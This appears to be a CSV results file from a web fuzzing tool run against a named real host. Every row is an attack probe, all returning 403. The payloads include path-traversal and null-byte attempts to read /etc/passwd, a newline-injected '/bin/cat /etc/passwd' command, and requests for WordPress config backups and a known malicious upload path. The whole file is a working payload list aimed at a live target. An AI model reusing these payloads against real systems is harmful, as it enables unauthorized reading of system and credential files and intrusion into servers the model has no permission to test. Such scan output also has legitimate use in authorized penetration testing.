FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
gallery/index.php?include=../../../../../../../../../etc/passwd,https://ftp.officevibe.com/gallery/index.php?include=../../../../../../../../../etc/passwd,,152,403,146,3,8,text/html,27.376218ms,
dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00,https://ftp.officevibe.com/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00,,505,403,146,3,8,text/html,27.4959ms,
forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1,https://ftp.officevibe.com/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1,,1755,403,146,3,8,text/html,27.411925ms,
pfdisplay.cgi?'%0A/bin/cat%20/etc/passwd|',https://ftp.officevibe.com/pfdisplay.cgi?'%0A/bin/cat%20/etc/passwd|',,2380,403,146,3,8,text/html,34.61779ms,
index.php?page=../../../../../../../../../../etc/passwd,https://ftp.officevibe.com/index.php?page=../../../../../../../../../../etc/passwd,,3342,403,146,3,8,text/html,30.251265ms,
wp-content/uploads/wp-craft-report.php,https://ftp.officevibe.com/wp-content/uploads/wp-craft-report.php,,3773,403,146,3,8,text/html,28.398873ms,
rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,https://ftp.officevibe.com/rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,,3942,403,146,3,8,text/html,27.000622ms,
plugins/vcard_attachments/composer.json,https://ftp.officevibe.com/plugins/vcard_attachments/composer.json,,4017,403,146,3,8,text/html,27.173033ms,
forum1.asp?n=/etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,https://ftp.officevibe.com/forum1.asp?n=/etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,,4626,403,146,3,8,text/html,28.002829ms,
FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,https://ftp.officevibe.com/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,,5130,403,146,3,8,text/html,27.15873ms,
plugins/subscriptions_option/composer.json,https://ftp.officevibe.com/plugins/subscriptions_option/composer.json,,5785,403,146,3,8,text/html,40.856571ms,
anacondaclip.pl?template=../../../../../../../../../../etc/passwd,https://ftp.officevibe.com/anacondaclip.pl?template=../../../../../../../../../../etc/passwd,,6173,403,146,3,8,text/html,27.392818ms,
FileSeek.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=,https://ftp.officevibe.com/FileSeek.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=,,6737,403,146,3,8,text/html,29.201899ms,
wp-config.php.save,https://ftp.officevibe.com/wp-config.php.save,,6947,403,146,3,8,text/html,30.197961ms,
plugins/attachment_reminder/composer.json,https://ftp.officevibe.com/plugins/attachment_reminder/composer.json,,6946,403,146,3,8,text/html,34.78161ms,
wp-config.php.dist,https://ftp.officevibe.com/wp-config.php.dist,,7739,403,146,3,8,text/html,26.890653ms,
forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,https://ftp.officevibe.com/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,,10561,403,146,3,8,text/html,35.341445ms,
cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=,https://ftp.officevibe.com/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=,,11256,403,146,3,8,text/html,30.821327ms,
modif_infos.asp?n=/etc/passwd,https://ftp.officevibe.com/modif_infos.asp?n=/etc/passwd,,11996,403,146,3,8,text/html,26.998458ms,
wp-config12.php,https://ftp.officevibe.com/wp-config12.php,,12053,403,146,3,8,text/html,33.420469ms,
nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00,https://ftp.officevibe.com/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00,,13167,403,146,3,8,text/html,27.153505ms,
cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd,https://ftp.officevibe.com/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd,,14129,403,146,3,8,text/html,26.993757ms,
content/base/build/explorer/none.php?/etc/passwd,https://ftp.officevibe.com/content/base/build/explorer/none.php?/etc/passwd,,14436,403,146,3,8,text/html,30.42816ms,
forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,https://ftp.officevibe.com/forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,,14689,403,146,3,8,text/html,27.696294ms,
emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00,https://ftp.officevibe.com/emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00,,15482,403,146,3,8,text/html,27.036932ms,
